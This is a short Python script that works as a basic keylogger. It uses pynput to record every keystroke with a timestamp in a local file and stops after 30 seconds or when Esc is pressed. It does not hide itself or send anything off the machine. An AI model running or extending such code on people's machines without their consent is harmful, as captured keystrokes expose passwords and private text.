import pynput
from pynput.keyboard import Key, Listener
import logging
from threading import Timer

max_duration = 30

logging.basicConfig(filename=("keylog.txt"),
                    level=logging.DEBUG, format="%(asctime)s: %(message)s")


def onKeyPress(key):
    if hasattr(key, 'char'):
        logging.info(f"key pressed: {key.char}")
    else:
        logging.info(f"Special key pressed: {key}")


def onKeyRelease(key):
    if key == Key.esc:
        return False


def stopListener():
    global listener
    print(f"Maximum duration has reached ({max_duration}s). Exiting...")
    logging.info(f"Maximum duration has reached ({max_duration}s). Exiting...")
    listener.stop()


timer = Timer(max_duration, stopListener)
timer.start()

# Start the listener
with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()


timer.cancel()
